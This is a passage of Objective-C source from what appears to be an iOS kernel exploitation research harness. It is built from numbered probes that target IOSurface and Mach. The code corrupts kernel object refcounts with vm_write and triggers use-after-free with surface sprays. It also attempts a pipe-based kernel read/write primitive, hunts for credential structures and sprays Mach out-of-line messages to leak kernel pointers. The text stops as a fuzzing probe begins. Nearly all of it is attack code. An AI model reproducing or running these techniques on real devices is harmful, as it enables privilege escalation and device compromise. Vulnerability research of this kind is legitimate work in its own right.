                    for (int rOff = -32; rOff <= 32; rOff += 8) {
                        uint64_t rval = 0;
                        vm_size_t rsz = 0;
                        kern_return_t rkr = vm_read_overwrite(mach_task_self(),
                                                              scanAddr + rOff, 8,
                                                              (vm_address_t)&rval, &rsz);
                        if (rkr == KERN_SUCCESS && rsz == 8) {
                            // Refcount should be a small positive integer (1-100)
                            if (rval >= 1 && rval <= 100 && rOff != 0) {
                                log([NSString stringWithFormat:@"REFCORR: Possible refcount at header%+d: %llu", rOff, rval]);
                                if (headerAddr == 0) {
                                    headerAddr = scanAddr;
                                    refcountOffset = rOff;
                                }
                                anomalies++;
                            }
                        }
                    }
                }
            }
            sym.unlock(targetSurf, 0, &seed2);
            log([NSString stringWithFormat:@"REFCORR: Found %d header candidates, refcount offset=%d", sentinelsFound, refcountOffset]);
        }

        // Step 3: Attempt to write refcount via vm_write
        log(@"REFCORR: Step 3 — Attempting refcount corruption");

        if (!isr_stopped() && headerAddr != 0 && refcountOffset >= -32) {
            vm_address_t refAddr = headerAddr + refcountOffset;
            uint64_t newRefcount = 1;
            kern_return_t wkr = vm_write(mach_task_self(), refAddr, (vm_offset_t)&newRefcount, 8);
            refcountWrites++;
            if (wkr == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"REFCORR: vm_write refcount=1 SUCCEEDED at 0x%lx!", (unsigned long)refAddr]);
                anomalies += 10;
            } else {
                log([NSString stringWithFormat:@"REFCORR: vm_write failed: %d", wkr]);
            }

            // Also try IOSurfaceSetValue to manipulate internal state
            if (setValue && !isr_stopped()) {
                setValue(targetSurf, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@1);
                setValue(targetSurf, CFSTR("IOSurfaceOffset"), (__bridge CFTypeRef)@0);
                refcountWrites++;
                log(@"REFCORR: IOSurfaceSetValue size manipulation attempted");
            }
        }

        // Step 4: Release the target surface to trigger potential UAF
        log(@"REFCORR: Step 4 — Releasing target + spray reclaim");

        IOSurfaceRef reclamSurfs[500];
        memset(reclamSurfs, 0, sizeof(reclamSurfs));
        int reclaimCount = 0;

        if (!isr_stopped() && targetSurf) {
            CFRelease(targetSurf);
            targetSurf = NULL;

            // Immediately spray 500 surfaces to reclaim freed pages
            NSDictionary *reclaimProps = @{
                @"IOSurfaceWidth": @256,
                @"IOSurfaceHeight": @256,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
            };
            for (int i = 0; i < 500 && !isr_stopped(); i++) {
                reclamSurfs[i] = sym.create((__bridge CFDictionaryRef)reclaimProps);
                if (reclamSurfs[i]) {
                    reclaimCount++;
                    uint32_t seed3 = 0;
                    sym.lock(reclamSurfs[i], 0, &seed3);
                    void *rb = sym.getBase(reclamSurfs[i]);
                    if (rb) {
                        // Write unique pattern
                        uint64_t pattern = 0xCAFEBABE00000000ULL | (uint64_t)i;
                        memset(rb, 0, 64);
                        memcpy(rb, &pattern, 8);
                    }
                    sym.unlock(reclamSurfs[i], 0, &seed3);
                }
            }
            pageReclaims = reclaimCount;
            log([NSString stringWithFormat:@"REFCORR: Sprayed %d reclaim surfaces", reclaimCount]);
        }

        // Step 5: Read via stale vm_remap mapping to detect UAF
        log(@"REFCORR: Step 5 — Reading stale vm_remap mapping for UAF detection");

        if (!isr_stopped() && remapAddr != 0) {
            int staleReads = 0;
            for (size_t off = 0; off < remapSize && off < 8192 && !isr_stopped(); off += 64) {
                uint64_t chunk[8];
                vm_size_t readSz = 0;
                kern_return_t kr = vm_read_overwrite(mach_task_self(),
                                                     remapAddr + off, 64,
                                                     (vm_address_t)chunk, &readSz);
                if (kr != KERN_SUCCESS || readSz != 64) continue;
                staleReads++;

                // Check if we see reclaim patterns (CAFEBABE...)
                for (int j = 0; j < 8; j++) {
                    if ((chunk[j] & 0xFFFFFFFF00000000ULL) == 0xCAFEBABE00000000ULL) {
                        uafDetected++;
                        staleDataHits++;
                        if (staleDataHits <= 10) {
                            log([NSString stringWithFormat:@"REFCORR: UAF DETECTED! remap+0x%lx[%d] = 0x%llx (reclaim surface %lld)",
                                 (unsigned long)off, j, chunk[j], chunk[j] & 0xFFFFFFFF]);
                        }
                        anomalies += 5;
                    }

                    // Check if original sentinel is gone (page was reclaimed)
                    if (chunk[j] != 0 && (chunk[j] & 0xFFFFFFFF) != 0x494F5346 && off < 4096) {
                        // Data changed from what we wrote — possible reclaim
                        if ((chunk[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                            log([NSString stringWithFormat:@"REFCORR: KERNEL DATA in stale mapping! +0x%lx[%d] = 0x%llx",
                                 (unsigned long)off, j, chunk[j]]);
                            anomalies += 3;
                            staleDataHits++;
                        }
                    }
                }
            }
            log([NSString stringWithFormat:@"REFCORR: Stale reads=%d, data hits=%d", staleReads, staleDataHits]);
        }

        // Cleanup
        if (remapAddr) vm_deallocate(mach_task_self(), remapAddr, remapSize);
        if (targetSurf) CFRelease(targetSurf);
        for (int i = 0; i < 500; i++) {
            if (reclamSurfs[i]) CFRelease(reclamSurfs[i]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"REFCORR: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"REFCORR: sentinels=%d refWrites=%d uaf=%d reclaims=%d staleHits=%d anomalies=%d",
             sentinelsFound, refcountWrites, uafDetected, pageReclaims, staleDataHits, anomalies]);

        NSString *verdict;
        if (uafDetected > 0) verdict = @"CRITICAL — controlled UAF via refcount corruption!";
        else if (staleDataHits > 0) verdict = @"HIGH — stale mapping shows different data post-free";
        else if (sentinelsFound > 5) verdict = @"MEDIUM — kernel object headers located via OOB";
        else if (refcountWrites > 0) verdict = @"LOW — write attempted but no UAF observed";
        else verdict = @"LOW — no refcount manipulation achieved";
        log([NSString stringWithFormat:@"REFCORR: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"sentinelsFound": @(sentinelsFound),
            @"refcountWrites": @(refcountWrites),
            @"uafDetected": @(uafDetected),
            @"pageReclaims": @(pageReclaims),
            @"staleDataHits": @(staleDataHits)
        };
        isr_checkpoint(@"ISR-RefcountCorrupt-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// ─── Probe 90: Pipe-based Kernel R/W Primitive ───

void iosurface_research_pipe_krw(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"PIPEKERNEL: === Probe 90: Pipe-based Kernel R/W ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int pipesCreated = 0;
        int sentinelsInHeap = 0;
        int readSuccesses = 0;
        int writeSuccesses = 0;
        int kernelDataFound = 0;
        int oobHits = 0;

        // Step 1: Create 256 pipe pairs with sentinel data
        log(@"PIPEKERNEL: Step 1 — Creating 256 pipe pairs with sentinel patterns");

        const int PIPE_COUNT = 256;
        int pipeFds[256][2];
        memset(pipeFds, -1, sizeof(pipeFds));
        uint32_t pipeSentinels[256];

        if (!isr_stopped()) {
            for (int i = 0; i < PIPE_COUNT && !isr_stopped(); i++) {
                if (pipe(pipeFds[i]) == 0) {
                    pipesCreated++;
                    // Write unique sentinel pattern to each pipe
                    pipeSentinels[i] = 0xBEEF0000 | (uint32_t)i;

                    // Write varying sizes (256 to 4096 bytes)
                    size_t writeSz = 256 + (i % 16) * 256;
                    uint8_t *buf = (uint8_t *)calloc(writeSz, 1);
                    if (buf) {
                        // Fill with sentinel pattern
                        for (size_t off = 0; off < writeSz; off += 4) {
                            uint32_t pattern = 0xBEEF0000 | (uint32_t)i;
                            memcpy(buf + off, &pattern, 4);
                        }
                        // Set non-blocking for write
                        int flags = fcntl(pipeFds[i][1], F_GETFL, 0);
                        fcntl(pipeFds[i][1], F_SETFL, flags | O_NONBLOCK);
                        write(pipeFds[i][1], buf, writeSz);
                        free(buf);
                    }
                } else {
                    pipeFds[i][0] = -1;
                    pipeFds[i][1] = -1;
                }
            }
            log([NSString stringWithFormat:@"PIPEKERNEL: Created %d pipe pairs", pipesCreated]);
        }

        // Step 2: Create IOSurfaces and scan OOB for pipe buffer sentinels
        log(@"PIPEKERNEL: Step 2 — Creating surfaces + OOB scan for pipe buffers");

        const int SURF_COUNT = 50;
        IOSurfaceRef surfs[50];
        memset(surfs, 0, sizeof(surfs));
        int surfCount = 0;

        if (!isr_stopped()) {
            for (int i = 0; i < SURF_COUNT && !isr_stopped(); i++) {
                int dim = 128 + (i % 8) * 64;
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @(dim),
                    @"IOSurfaceHeight": @(dim),
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @0x42475241,
                };
                surfs[i] = sym.create((__bridge CFDictionaryRef)props);
                if (surfs[i]) surfCount++;
            }
            log([NSString stringWithFormat:@"PIPEKERNEL: Created %d probe surfaces", surfCount]);
        }

        // Step 3: OOB scan for pipe sentinel patterns
        log(@"PIPEKERNEL: Step 3 — OOB scanning for pipe buffer sentinels");

        typedef struct {
            int surfIdx;
            size_t offset;
            uint32_t pipeIdx;
            uint64_t fullVal;
        } PipeHit;

        PipeHit pipeHits[128];
        int hitCount = 0;

        if (!isr_stopped()) {
            for (int s = 0; s < SURF_COUNT && !isr_stopped(); s++) {
                if (!surfs[s]) continue;
                uint32_t seed = 0;
                kern_return_t kr = sym.lock(surfs[s], 0, &seed);
                if (kr != KERN_SUCCESS) continue;

                void *base = sym.getBase(surfs[s]);
                size_t allocSz = sym.getAllocSize(surfs[s]);
                if (!base || allocSz == 0) {
                    sym.unlock(surfs[s], 0, &seed);
                    continue;
                }

                // Scan forward OOB up to 64KB
                for (size_t off = allocSz; off < allocSz + 65536 && !isr_stopped(); off += 4) {
                    uint32_t val32 = 0;
                    vm_size_t readSz = 0;
                    kern_return_t rkr = vm_read_overwrite(mach_task_self(),
                                                          (vm_address_t)base + off, 4,
                                                          (vm_address_t)&val32, &readSz);
                    if (rkr != KERN_SUCCESS || readSz != 4) {
                        // Crossed page boundary — skip ahead
                        off = (off + 0x1000) & ~0xFFFUL;
                        off -= 4; // loop will add 4
                        continue;
                    }
                    oobHits++;

                    // Check for BEEF sentinel
                    if ((val32 & 0xFFFF0000) == 0xBEEF0000) {
                        uint32_t pipeIdx = val32 & 0xFFFF;
                        if (pipeIdx < PIPE_COUNT && hitCount < 128) {
                            sentinelsInHeap++;
                            // Read full 8 bytes for context
                            uint64_t val64 = 0;
                            vm_read_overwrite(mach_task_self(),
                                              (vm_address_t)base + off, 8,
                                              (vm_address_t)&val64, &readSz);
                            pipeHits[hitCount].surfIdx = s;
                            pipeHits[hitCount].offset = off - allocSz;
                            pipeHits[hitCount].pipeIdx = pipeIdx;
                            pipeHits[hitCount].fullVal = val64;
                            hitCount++;

                            if (sentinelsInHeap <= 20) {
                                log([NSString stringWithFormat:@"PIPEKERNEL: PIPE BUFFER FOUND! S%d+0x%lx pipe=%d val=0x%llx",
                                     s, (unsigned long)(off - allocSz), pipeIdx, val64]);
                            }
                            anomalies += 3;
                        }
                    }

                    // Also check for kernel pointers near pipe buffers
                    if (sentinelsInHeap > 0 && (val32 & 0xFFF00000) == 0xFFF00000) {
                        uint64_t kval = 0;
                        vm_size_t ksz = 0;
                        kern_return_t kkr = vm_read_overwrite(mach_task_self(),
                                                               (vm_address_t)base + off, 8,
                                                               (vm_address_t)&kval, &ksz);
                        if (kkr == KERN_SUCCESS && ksz == 8) {
                            if ((kval & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                                kernelDataFound++;
                                if (kernelDataFound <= 10) {
                                    log([NSString stringWithFormat:@"PIPEKERNEL: KERNEL PTR near pipe! S%d+0x%lx = 0x%llx",
                                         s, (unsigned long)(off - allocSz), kval]);
                                }
                                anomalies += 2;
                            }
                        }
                    }
                }
                sym.unlock(surfs[s], 0, &seed);
            }
            log([NSString stringWithFormat:@"PIPEKERNEL: Found %d pipe sentinels, %d kernel ptrs, %d OOB hits",
                 sentinelsInHeap, kernelDataFound, oobHits]);
        }

        // Step 4: Attempt write via vm_write to pipe buffer location, verify via pipe read
        log(@"PIPEKERNEL: Step 4 — Pipe R/W primitive test");

        if (!isr_stopped() && hitCount > 0) {
            for (int h = 0; h < hitCount && h < 10 && !isr_stopped(); h++) {
                int sIdx = pipeHits[h].surfIdx;
                if (!surfs[sIdx]) continue;

                uint32_t seed = 0;
                kern_return_t kr = sym.lock(surfs[sIdx], 0, &seed);
                if (kr != KERN_SUCCESS) continue;

                void *base = sym.getBase(surfs[sIdx]);
                size_t allocSz = sym.getAllocSize(surfs[sIdx]);

                if (base && allocSz > 0) {
                    vm_address_t pipeAddr = (vm_address_t)base + allocSz + pipeHits[h].offset;

                    // Attempt vm_write to the pipe buffer location
                    uint32_t writeData = 0xDEAD0000 | (uint32_t)h;
                    kern_return_t wkr = vm_write(mach_task_self(), pipeAddr, (vm_offset_t)&writeData, 4);
                    if (wkr == KERN_SUCCESS) {
                        writeSuccesses++;
                        log([NSString stringWithFormat:@"PIPEKERNEL: vm_write to pipe buffer SUCCEEDED! pipe=%d",
                             pipeHits[h].pipeIdx]);
                        anomalies += 10;

                        // Read back from pipe fd to verify write
                        int pIdx = pipeHits[h].pipeIdx;
                        if (pIdx < PIPE_COUNT && pipeFds[pIdx][0] >= 0) {
                            uint8_t readBuf[4096];
                            int flags = fcntl(pipeFds[pIdx][0], F_GETFL, 0);
                            fcntl(pipeFds[pIdx][0], F_SETFL, flags | O_NONBLOCK);
                            ssize_t rd = read(pipeFds[pIdx][0], readBuf, sizeof(readBuf));
                            if (rd > 0) {
                                readSuccesses++;
                                // Check if our written data appears in pipe output
                                for (ssize_t off = 0; off < rd - 3; off++) {
                                    uint32_t check;
                                    memcpy(&check, readBuf + off, 4);
                                    if (check == writeData) {
                                        log([NSString stringWithFormat:@"PIPEKERNEL: WRITE VERIFIED! Wrote 0x%x to pipe buffer, read it back at offset %zd",
                                             writeData, off]);
                                        anomalies += 20;
                                    }
                                }
                            }
                        }
                    }
                }
                sym.unlock(surfs[sIdx], 0, &seed);
            }
        }

        // Step 5: Scan for kernel task port and credential structures
        log(@"PIPEKERNEL: Step 5 — Scanning for kernel structures near pipe buffers");

        if (!isr_stopped() && hitCount > 0) {
            for (int h = 0; h < hitCount && h < 5 && !isr_stopped(); h++) {
                int sIdx = pipeHits[h].surfIdx;
                if (!surfs[sIdx]) continue;

                uint32_t seed = 0;
                kern_return_t kr = sym.lock(surfs[sIdx], 0, &seed);
                if (kr != KERN_SUCCESS) continue;

                void *base = sym.getBase(surfs[sIdx]);
                size_t allocSz = sym.getAllocSize(surfs[sIdx]);

                if (base && allocSz > 0) {
                    // Read 4KB around the pipe buffer location
                    vm_address_t scanStart = (vm_address_t)base + allocSz + pipeHits[h].offset;
                    // Align to page
                    scanStart &= ~0xFFFUL;

                    uint8_t pageBuf[4096];
                    vm_size_t readSz = 0;
                    kern_return_t rkr = vm_read_overwrite(mach_task_self(), scanStart, 4096,
                                                          (vm_address_t)pageBuf, &readSz);
                    if (rkr == KERN_SUCCESS && readSz == 4096) {
                        int kptrs = 0;
                        int zeroPtrs = 0;
                        int smallInts = 0;
                        for (int off = 0; off < 4096; off += 8) {
                            uint64_t val;
                            memcpy(&val, pageBuf + off, 8);
                            if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) kptrs++;
                            if (val == 0) zeroPtrs++;
                            if (val > 0 && val < 1000) smallInts++;
                        }
                        log([NSString stringWithFormat:@"PIPEKERNEL: Page scan near pipe %d: kptrs=%d zeros=%d smallInts=%d",
                             pipeHits[h].pipeIdx, kptrs, zeroPtrs, smallInts]);

                        // Credential structure heuristic: many small integers (uid/gid) + some kernel pointers
                        if (smallInts > 5 && kptrs > 0) {
                            log([NSString stringWithFormat:@"PIPEKERNEL: POSSIBLE CREDENTIAL STRUCTURE near pipe %d!",
                                 pipeHits[h].pipeIdx]);
                            anomalies += 5;
                            kernelDataFound++;
                        }
                    }
                }
                sym.unlock(surfs[sIdx], 0, &seed);
            }
        }

        // Cleanup
        for (int i = 0; i < PIPE_COUNT; i++) {
            if (pipeFds[i][0] >= 0) close(pipeFds[i][0]);
            if (pipeFds[i][1] >= 0) close(pipeFds[i][1]);
        }
        for (int i = 0; i < SURF_COUNT; i++) {
            if (surfs[i]) CFRelease(surfs[i]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"PIPEKERNEL: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"PIPEKERNEL: pipes=%d sentinels=%d reads=%d writes=%d kernelData=%d oobHits=%d anomalies=%d",
             pipesCreated, sentinelsInHeap, readSuccesses, writeSuccesses, kernelDataFound, oobHits, anomalies]);

        NSString *verdict;
        if (writeSuccesses > 0 && readSuccesses > 0) verdict = @"CRITICAL — pipe-based kernel R/W primitive achieved!";
        else if (writeSuccesses > 0) verdict = @"CRITICAL — kernel write via pipe buffer!";
        else if (sentinelsInHeap > 5) verdict = @"HIGH — pipe buffers located in kernel heap via OOB";
        else if (sentinelsInHeap > 0) verdict = @"MEDIUM — pipe sentinel found in heap";
        else if (kernelDataFound > 0) verdict = @"MEDIUM — kernel data found near heap boundary";
        else verdict = @"LOW — pipe buffers not found in OOB range";
        log([NSString stringWithFormat:@"PIPEKERNEL: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"pipesCreated": @(pipesCreated),
            @"sentinelsInHeap": @(sentinelsInHeap),
            @"readSuccesses": @(readSuccesses),
            @"writeSuccesses": @(writeSuccesses),
            @"kernelDataFound": @(kernelDataFound),
            @"oobHits": @(oobHits)
        };
        isr_checkpoint(@"ISR-PipeKRW-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

#pragma mark - Round 30: Strategy Pivot

// Probe 91: Mach OOL Message Spray
void iosurface_research_ool_spray(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) {
            log(@"OOLSPRAY: Failed to load symbols");
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }
        log(@"OOLSPRAY: === Probe 91: Mach OOL Message Spray ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int portsCreated = 0;
        int messagesSent = 0;
        int portsFreed = 0;
        int reclaimDetected = 0;
        int dataLeaks = 0;
        int writesConfirmed = 0;

        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
        typedef CFTypeRef (*GetValueFn)(IOSurfaceRef, CFStringRef);
        GetValueFn getValue = (GetValueFn)dlsym(sym.iosurface, "IOSurfaceGetValue");

        // Step 1: Create mach ports and send OOL messages
        #define OOL_PORT_COUNT 1024
        #define OOL_DATA_SIZE 256
        mach_port_t oolPorts[OOL_PORT_COUNT];
        memset(oolPorts, 0, sizeof(oolPorts));

        log(@"OOLSPRAY: Step 1 — Creating 1024 mach ports with OOL messages");

        // Prepare sentinel data
        uint8_t sentinel[OOL_DATA_SIZE];
        for (int i = 0; i < OOL_DATA_SIZE; i += 8) {
            sentinel[i]   = 0x41; sentinel[i+1] = 0x41;
            sentinel[i+2] = 0x41; sentinel[i+3] = 0x41;
            sentinel[i+4] = 0x42; sentinel[i+5] = 0x42;
            sentinel[i+6] = 0x42; sentinel[i+7] = 0x42;
        }

        if (!isr_stopped()) {
            for (int i = 0; i < OOL_PORT_COUNT && !isr_stopped(); i++) {
                kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[i]);
                if (kr == KERN_SUCCESS) {
                    portsCreated++;

                    // Insert send right
                    mach_port_insert_right(mach_task_self(), oolPorts[i], oolPorts[i], MACH_MSG_TYPE_MAKE_SEND);

                    // Build OOL message
                    struct {
                        mach_msg_header_t header;
                        mach_msg_body_t body;
                        mach_msg_ool_descriptor_t ool;
                    } msg;
                    memset(&msg, 0, sizeof(msg));

                    msg.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
                    msg.header.msgh_size = sizeof(msg);
                    msg.header.msgh_remote_port = oolPorts[i];
                    msg.header.msgh_local_port = MACH_PORT_NULL;
                    msg.header.msgh_id = 0x41414141;

                    msg.body.msgh_descriptor_count = 1;

                    msg.ool.address = sentinel;
                    msg.ool.size = OOL_DATA_SIZE;
                    msg.ool.deallocate = 0;
                    msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
                    msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

                    kr = mach_msg(&msg.header,
                                  MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                  sizeof(msg), 0, MACH_PORT_NULL,
                                  100, MACH_PORT_NULL);
                    if (kr == KERN_SUCCESS) {
                        messagesSent++;
                    }
                }
            }
            log([NSString stringWithFormat:@"OOLSPRAY: Created %d ports, sent %d OOL messages", portsCreated, messagesSent]);
        }

        // Step 2: Free half the ports to create holes in kalloc
        if (!isr_stopped()) {
            log(@"OOLSPRAY: Step 2 — Freeing 512 ports to create kalloc holes");
            for (int i = 0; i < OOL_PORT_COUNT; i += 2) {
                if (oolPorts[i] != MACH_PORT_NULL) {
                    mach_port_deallocate(mach_task_self(), oolPorts[i]);
                    mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
                    oolPorts[i] = MACH_PORT_NULL;
                    portsFreed++;
                }
            }
            log([NSString stringWithFormat:@"OOLSPRAY: Freed %d ports", portsFreed]);
        }

        // Step 3: Create IOSurfaces to reclaim freed kalloc slots
        #define RECLAIM_SURF_COUNT 256
        IOSurfaceRef reclaimSurfs[RECLAIM_SURF_COUNT];
        memset(reclaimSurfs, 0, sizeof(reclaimSurfs));

        if (!isr_stopped()) {
            log(@"OOLSPRAY: Step 3 — Spraying 256 IOSurfaces with property data to reclaim kalloc holes");

            NSDictionary *props = @{
                @"IOSurfaceWidth":  @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
            };

            for (int i = 0; i < RECLAIM_SURF_COUNT && !isr_stopped(); i++) {
                reclaimSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
                if (reclaimSurfs[i] && setValue) {
                    // Set properties with specific patterns to detect reclaim
                    NSString *key = [NSString stringWithFormat:@"OOLReclaim_%d", i];
                    NSData *pattern = [NSData dataWithBytes:sentinel length:OOL_DATA_SIZE];
                    setValue(reclaimSurfs[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)pattern);
                }
            }

            log([NSString stringWithFormat:@"OOLSPRAY: Sprayed %d reclaim surfaces", RECLAIM_SURF_COUNT]);
        }

        // Step 4: Read remaining OOL messages to check for cross-contamination
        if (!isr_stopped()) {
            log(@"OOLSPRAY: Step 4 — Reading remaining OOL messages for cross-contamination");

            for (int i = 1; i < OOL_PORT_COUNT && !isr_stopped(); i += 2) {
                if (oolPorts[i] == MACH_PORT_NULL) continue;

                struct {
                    mach_msg_header_t header;
                    mach_msg_body_t body;
                    mach_msg_ool_descriptor_t ool;
                    mach_msg_trailer_t trailer;
                } recv;
                memset(&recv, 0, sizeof(recv));

                kern_return_t kr = mach_msg(&recv.header,
                                            MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                            0, sizeof(recv), oolPorts[i],
                                            100, MACH_PORT_NULL);
                if (kr == KERN_SUCCESS && recv.body.msgh_descriptor_count == 1) {
                    uint8_t *oolData = (uint8_t *)recv.ool.address;
                    vm_size_t oolSize = recv.ool.size;

                    if (oolData && oolSize >= OOL_DATA_SIZE) {
                        // Check if data changed (cross-contamination from IOSurface reclaim)
                        int differences = 0;
                        for (vm_size_t b = 0; b < oolSize && b < OOL_DATA_SIZE; b++) {
                            if (oolData[b] != sentinel[b]) differences++;
                        }
                        if (differences > 0) {
                            reclaimDetected++;
                            anomalies += 3;
                            log([NSString stringWithFormat:@"OOLSPRAY: CROSS-CONTAMINATION at port[%d]: %d bytes differ!", i, differences]);

                            // Check if it looks like kernel data
                            for (vm_size_t b = 0; b + 7 < oolSize; b += 8) {
                                uint64_t val = *(uint64_t *)(oolData + b);
                                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
                                    (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                    dataLeaks++;
                                    anomalies += 5;
                                    log([NSString stringWithFormat:@"OOLSPRAY: KERNEL PTR LEAK at port[%d]+%zu: 0x%llx", i, (size_t)b, val]);
                                }
                            }
                        }

                        // Deallocate OOL data
                        vm_deallocate(mach_task_self(), (vm_address_t)oolData, oolSize);
                    }
                }
            }

            log([NSString stringWithFormat:@"OOLSPRAY: Cross-contamination=%d, kernel leaks=%d", reclaimDetected, dataLeaks]);
        }

        // Step 5: Try writing via IOSurfaceSetValue and reading back via OOL
        if (!isr_stopped() && setValue && getValue) {
            log(@"OOLSPRAY: Step 5 — Attempting write via IOSurface property to corrupt OOL");

            for (int i = 0; i < RECLAIM_SURF_COUNT && !isr_stopped(); i++) {
                if (!reclaimSurfs[i]) continue;
                // Write a distinctive pattern
                uint8_t writePattern[OOL_DATA_SIZE];
                memset(writePattern, 0xCC, OOL_DATA_SIZE);
                writePattern[0] = 0xDE; writePattern[1] = 0xAD;
                writePattern[2] = 0xBE; writePattern[3] = 0xEF;

                NSData *writeData = [NSData dataWithBytes:writePattern length:OOL_DATA_SIZE];
                for (int k = 0; k < 10; k++) {
                    NSString *key = [NSString stringWithFormat:@"OOLWrite_%d_%d", i, k];
                    setValue(reclaimSurfs[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)writeData);
                }

                // Read back from adjacent OOL port
                int adjIdx = (i * 2 + 1 < OOL_PORT_COUNT) ? i * 2 + 1 : -1;
                if (adjIdx >= 0 && oolPorts[adjIdx] != MACH_PORT_NULL) {
                    CFTypeRef readBack = getValue(reclaimSurfs[i], (__bridge CFStringRef)[NSString stringWithFormat:@"OOLWrite_%d_0", i]);
                    if (readBack && CFGetTypeID(readBack) == CFDataGetTypeID()) {
                        CFDataRef dataRef = (CFDataRef)readBack;
                        if (CFDataGetLength(dataRef) != OOL_DATA_SIZE) {
                            writesConfirmed++;
                            anomalies += 5;
                            log([NSString stringWithFormat:@"OOLSPRAY: WRITE SIZE ANOMALY at surf[%d]: expected=%d got=%ld",
                                 i, OOL_DATA_SIZE, CFDataGetLength(dataRef)]);
                        }
                    }
                }
            }
        }

        // Cleanup
        for (int i = 0; i < OOL_PORT_COUNT; i++) {
            if (oolPorts[i] != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), oolPorts[i]);
                mach_port_mod_refs(mach_task_self(), oolPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
            }
        }
        for (int i = 0; i < RECLAIM_SURF_COUNT; i++) {
            if (reclaimSurfs[i]) CFRelease(reclaimSurfs[i]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"OOLSPRAY: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"OOLSPRAY: ports=%d msgs=%d freed=%d reclaims=%d leaks=%d writes=%d anomalies=%d",
             portsCreated, messagesSent, portsFreed, reclaimDetected, dataLeaks, writesConfirmed, anomalies]);

        NSString *verdict;
        if (writesConfirmed > 0 && dataLeaks > 0) verdict = @"CRITICAL — OOL cross-contamination + kernel ptr leak + write anomaly!";
        else if (dataLeaks > 0) verdict = @"CRITICAL — kernel pointers leaked via OOL cross-contamination!";
        else if (reclaimDetected > 0) verdict = @"HIGH — OOL data cross-contaminated by IOSurface reclaim!";
        else if (writesConfirmed > 0) verdict = @"MEDIUM — write anomaly detected in property storage";
        else verdict = @"LOW — no cross-contamination detected (zone isolation effective)";
        log([NSString stringWithFormat:@"OOLSPRAY: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"portsCreated": @(portsCreated),
            @"messagesSent": @(messagesSent),
            @"portsFreed": @(portsFreed),
            @"reclaimDetected": @(reclaimDetected),
            @"dataLeaks": @(dataLeaks),
            @"writesConfirmed": @(writesConfirmed)
        };
        isr_checkpoint(@"ISR-OOLSpray-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// Probe 92: IOKit External Method Fuzzing
void iosurface_research_ioconn_call(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) {
            log(@"IOCONNCALL: Failed to load symbols");
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }
        log(@"IOCONNCALL: === Probe 92: IOKit External Method Fuzzing ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int selectorsTested = 0;
        int successes = 0;
        int failures = 0;
